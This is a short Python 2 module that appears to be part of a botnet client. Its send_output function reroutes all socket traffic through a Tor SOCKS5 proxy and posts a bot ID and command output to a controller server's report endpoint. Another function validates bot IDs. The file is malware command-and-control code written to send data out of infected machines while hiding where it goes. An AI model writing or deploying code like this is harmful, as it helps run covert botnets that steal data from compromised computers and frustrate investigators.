import requests
import re
import settings
import socks, socket, urllib2 , urllib

def create_connection(address, timeout=None, source_address=None):   
	sock = socks.socksocket()  
	sock.connect(address)   
	return sock
	
def send_output(output):
	
	socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, settings.PROXY_TOR_IP, settings.PROXY_TOR_PORT)
	socket.socket = socks.socksocket
	socket.create_connection = create_connection

	url = settings.SERVER_URL + "/api/report"
	values = {'botid': settings.BOT_ID, 'output': output}  
	data = urllib.urlencode(values)
	req = urllib2.Request(url, data)
	response = urllib2.urlopen(req)

		
def validate_botid(candidate):
    return re.match('^[a-zA-Z0-9\s\-_]+$', candidate) is not None
